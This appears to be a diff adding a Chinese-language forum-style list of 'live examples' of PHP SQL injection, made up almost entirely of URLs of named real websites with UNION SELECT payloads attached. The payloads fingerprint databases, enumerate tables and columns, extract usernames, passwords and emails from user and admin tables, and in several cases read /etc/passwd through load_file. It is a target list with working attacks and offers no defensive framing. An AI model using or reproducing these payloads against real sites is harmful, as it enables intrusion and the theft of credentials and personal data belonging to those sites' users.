@@ -1,0 +1,71 @@
+灵活的php注入＋活的实例演示！ 老外那里挖的
+
+http://www.ihrc.org.uk/show.php?id=-99+UNION+ALL+SELECT+1,2,version(),4,5,6,7,8,9,10,11,12,13-- 
+http://www.witchcraft.nu/newsitem.php?id=-99+UNION+ALL+SELECT+1,version(),3,4,5,6,7,8,9,10-- 
+http://ccsmi.fas.sfu.ca/newsItem.php?id=-99+UNION+ALL+SELECT+1,2,3,version(),5,6,7,8-- 
+http://www.senesco.com/newsitem.php?id=-99+UNION+ALL+SELECT+1,2,3,table_name,5%20from%20information_schema.tables%20where%20table_schema=database ()-- 
+http://www.hpcalc.org/details.php?id=-99+UNION+ALL+SELECT+1,concat_ws(0x3a,id,password,email),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,2 2,23,24,25,26,27,28,29+from+users-- 
+http://www.atlmetal.com/bands/band.php?id=-99+UNION+ALL+SELECT+1,version(),3,4,5,6,7,8,9,10,11,12,13,14-- 
+http://www.rocklab.it/band.php?id=-99+UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 
+http://www.bandlist24.de/band.php?id=-99+UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31-- 
+http://www.listenuppresident.com ... +UNION+ALL+SELECT+1,2,3,4,5,6,concat_ws(0x3a,Name,Email,Password),8+from+Members%20limit%20 1,1-- 
+http://www.hamdrams.co.uk/admin.php?id=-99+UNION+ALL+SELECT+1,2,concat_ws(0x3a,username,user_password),4,5,6,7,8,9,10,11%20from%20phpbb_users-- 
+http://www.correiagroup.com/agent.php?id=-99+UNION+ALL+SELECT+1,version(),3,4,5,6,7,8,9,10,11,12-- 
+http://www.eralincolnrealty.net/ ... +UNION+ALL+SELECT+1,2,3,column_name,5,6,7%20from%20information_schema.columns%20where%20table_nam e='Agent'%20limit%205,1-- 
+http://www.estatesmall.com/real- ... +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,version(),12,13,14,15-- 
+http://www.fourstarrealty.com/agent.php?id=-99+UNION+ALL+SELECT+1,table_name,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%20from%20admin-- 
+http://www.rpmre.com/arealsys/agent.php?id=-99+UNION+ALL+SELECT+1,version(),3,4,5,6,7,8,9,10,11,12,13-- 
+http://internet-shares.com/users.php?id=-99+UNION+ALL+SELECT+1,2,concat(username,0x3a,password,0x3a,email),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 ,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36+from+users%20limit%201,1-- 
+http://www.punkarchives.com/users.php?ID=-99+UNION+ALL+SELECT+1,concat_ws(0x3a,username,password,Email),3,4,5,6+from+users-- 
+http://www.memfis.eu/ko7e7a/users.php?id=-99+UNION+ALL+SELECT+1,2,concat_ws(0x3a,nick,name,email,text),4,5,6,7+from+users-- 
+http://www.listenuppresident.com ... +UNION+ALL+SELECT+1,2,3,4,5,6,concat_ws(0x3a,Name,Email,Password),8+from+Members%20limit%20 1,1-- 
+http://www.newportcoastbroker.co ... +UNION+ALL+SELECT+1,2,unhex(hex(load_file(0x2F6574632F706173737764)))%20from%20mysql.user-- 
+http://www.gamesector.org/review.php?id=-83+UNION+ALL+SELECT+1,2,concat_ws(0x3a,version(),user(),database()),4,5,6,7,8,9,10-- 
+http://www.bgra.net/2004/review.php?id=-12+UNION+ALL+SELECT+1,concat_ws(0x3a,version(),user(),database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,1 8,19,20,21,22,23,24,25,26-- 
+http://www.btne.org/members.php?id=-6+UNION+ALL+SELECT+user(),database(),version()-- 
+http://cormaci.com/pat.php?id=-2+UNION+ALL+SELECT+1,2,3,4,5,6,7,8,concat_ws(0x3a,version(),database(),user()),10-- 
+http://www.punbb.fr/styles/style.php?id=-93+UNION+ALL+SELECT+1,0x4E65757472616C69736564,database(),4,5,null,7,8,9-- 
+http://www.punbb.fr/styles/style.php?id=-93+UNION+ALL+SELECT+1,concat_ws(0x3a,username,password),database(),4,5,null,7,8,9+from+punbb_users+limit +1,1-- 
+http://travalor.com/hunt.php?id=-3+UNION+ALL+SELECT+1,2,concat_ws(0x3a,username,password,email),4,5,6,7,8,9,10,11,12,13,14,15,16+from+users+limit +0,1-- 
+http://www.thefalesteam.com/sell.php?ID=-64+UNION+ALL+SELECT+1,2,3,4,5,6,unhex(hex(concat_ws(0x3a,version(),user(),database()))),8,9,10,11,12-- 
+http://www.loffice.org/affiliate ... +UNION+ALL+SELECT+1,concat_ws(0x3a,nom,adresse,tel,mail,password),3,4,5,6,7,8,9,10,11,12,13,1 4,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,6 4,65,66,67,68,69,70,71,72,73,74,75,76,77,78+from+membre+limit+0,1-- 
+http://haasbuilders.com/auth.php?id=-39+UNION+ALL+SELECT+1,concat_ws(0x3a,project_id,project_password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17+from +projects+where+project_id+=+36-- 
+http://ocmusicfest09.com/artist/bio.php?id=-99+UNION+ALL+SELECT+1,2,3,4,5,6,concat_ws(0x3a,user_name,password,password_hint),8,9,10,11,12,13+from +deleterec-- 
+http://www.theatreview.org.nz/re ... +UNION+ALL+SELECT+1,2,3,4,5,concat_ws(0x3a,username,email,password),7,8,9,10,11,12,13,14 ,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30+from+members+limit+0,1-- 
+http://www.thebartend.com/drinks ... +UNION+ALL+SELECT+1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8,9-- 
+http://turfwars2.com/user.php?id=-30+UNION+ALL+SELECT+1,concat_ws(0x3a,username,password,email),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 ,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+users+limit+1,1-- 
+http://www.lingo.org.za/short.php?id=-40+UNION+ALL+SELECT+1,2,3,4,5,unhex(hex(password)),7,8,9+from+user-- 
+http://www.lfks.org/halloffame.php?id=-15+UNION+ALL+SELECT+1,id,3,4,5,6,7+from+halloffame-- 
+http://www.spacefleetonline.com/ ... LL+SELECT+concat_ws(0x3a,user_name,real_name,email,address,password)+from+user+limit+0,1 -- 
+https://www.ncsy.ca/email.php?id=-7+UNION+ALL+SELECT+1,concat_ws(0x3a,version(),user(),database()),3-- 
+http://www.beaufortbooks.com/books.php?id=-53+UNION+ALL+SELECT+1,concat_ws(0x3a,username,password,email),3,4,5,6,7,8,9,10,11,12,13+from+users+lim it+0,1-- 
+http://www.andytimmons.com/video.php?id=-0003+UNION+ALL+SELECT+1,unhex(hex(concat_ws(0x3a,version(),user(),database()))),3,4,5,6,7,8-- 
+http://www.law-and-numbers.de/de ... +UNION+ALL+SELECT+1,null,3,null,0x4E65757472616C69736564,column_name,null,8,9+from+informatio n_schema.columns+limit+0,1-- 
+http://www.uwtuib.com/members.php?id=53+UNION+ALL+SELECT+1,2,concat_ws(0x3a,lname,password,email),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21 ,22,23,24,25,26,27,28,29,30,31,32+from+members+limit+0,1-- 
+http://www.retailtherapy.tv/video.php?id=-163+UNION+ALL+SELECT+1,2,3,concat_ws(0x3a,id),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+from+members-- 
+http://www.notbbc.co.uk/janet/ms ... +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,unhex(hex(concat_ws(0x3a,version(),user(),d atabase()))),14,15,16-- 
+http://www.visitmaldives.com/FAQ/faq.php?Id=-4+UNION+ALL+SELECT+1,2,concat_ws(0x3a,username,password,email),4,5+from+users+limit+0,1-- 
+http://www.fair-media.info/reque ... ON+ALL+SELECT+unhex(hex(concat_ws(0x3a,version(),user(),database()))),2-- 
+http://www.langsfordcenter.com/o ... +UNION+ALL+SELECT+1,2,concat_ws(0x3a,adminid,password)+from+admin_login+limit+2,1-- 
+http://supersport-ci.com/scan.php?id=-42+UNION+ALL+SELECT+1,2,3,4,concat_ws(0x3a,version(),database(),user())-- 
+http://www.thediamondworks.co.za ... +UNION+ALL+SELECT+1,2,version(),0x4E65757472616C69736564+from+admin-- 
+http://www.nortec.no/stjordal/pc.php?id=-41+UNION+ALL+SELECT+1,2,table_name,4 from information_schema.tables where table_schema=database()-- 
+http://www.webhoster4u.de/server ... +ALL+SELECT+version(),database()-- 
+http://ens.ewi.tudelft.nl/People ... +UNION+ALL+SELECT+1,2,3,4,5,table_name,7,8,9,10,11,12,13%20from%20information_schema.tables%20wher e%20table_schema=database()%20limit%200,1-- 
+http://www.putridflowers.com/music.php?id=-17+UNION+ALL+SELECT+1,2,database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 
+https://shop.invictusnetworks.co ... +UNION+ALL+SELECT+1,database(),3,4,5,6,7,8,9,10,11,12-- 
+http://sandiegoscreensavers.com/ ... +UNION+ALL+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29, 30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,concat_ws(0x 3a,discount_type,discount_category,discount_currpct,discount_value,discount_active,discount_ref,discount_expiration),77,78,79,80,81,82,83,84,85,86,87, 88+from+discount-- 
+http://www.schoolbytes.com/summary.php?id=-99+UNION+ALL+SELECT+1,2,concat(username,0x3a,password),4,5,6,7,8,9,10,11,12+from+users-- 
+http://www.toprightcorner.com/bio.php?id=-99+UNION+ALL+SELECT+1,2,3,4,4-- 
+http://www.wang-li.com/art.php?id=-118+UNION+ALL+SELECT+1,2,load_file(0x2F6574632F706173737764),4-- 
+http://www.twisterella.com/indie ... +UNION+ALL+SELECT+1,2,3,4,5,concat(username,0x3a,password),7,0x4E65757472616C69736564,9,10, 11+from+users+limit+0,1-- 
+http://www.wan-t.cn/www/sec.php?id=-48+UNION+ALL+SELECT+1,2,3,4,5,6,7,0x4E65757472616C69736564-- 
+http://www.womenastronomers.com/ ... N+ALL+SELECT+concat(username,0x3a,passwor d),2,3,4+from+users---3+UNION+ALL+SELECT+1,null,0x4E65757472616C69736564,4,concat_ws(0x3a,version(),user(),database())-- 
+http://www.fclarchives.org.nz/re ... N+ALL+SELECT+concat(username,0x3a,password),2,3,4+from+users-- 
+http://www.erdelyikopo.net/text/text.php?id=-5+UNION+ALL+SELECT+1,2,3,4,5,6,7,8,concat_ws(0x3a,email,username,password,level)+from+members+limit+ 0,1-- 
+http://eng.chiptronic.com/text.php?id=-9+UNION+ALL+SELECT+1,2,3,4,5,6,column_name,8,9,10,11,12-- 
+http://www.bitepublishing.co.uk/ ... +UNION+ALL+SELECT+1,concat_ws(0x3,user,pass,admin),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19, 20,21,22,23,24+from+staff-- 
+http://www.drivers-download.com/ ... +UNION+ALL+SELECT+1,2,load_file(0x2F6574632F706173737764),4,5,6,7,8,9,10-- 
+http://www.consul.cc/email.php?id=-1068+UNION+ALL+SELECT+null,concat_ws(0x3a,email,password),3,4,5+from+Users+limit+3,1-- 
+http://www.f1latam.com/esp.php?id=-8+UNION+ALL+SELECT+1,0x4E65757472616C69736564,3,concat_ws(0x3a,version(),database(),user()),5,6-- 
+http://bia2.com/music-review/rev ... +UNION+ALL+SELECT+1,2,3,4,5,version(),7,8,9,10,11,12,13,14--
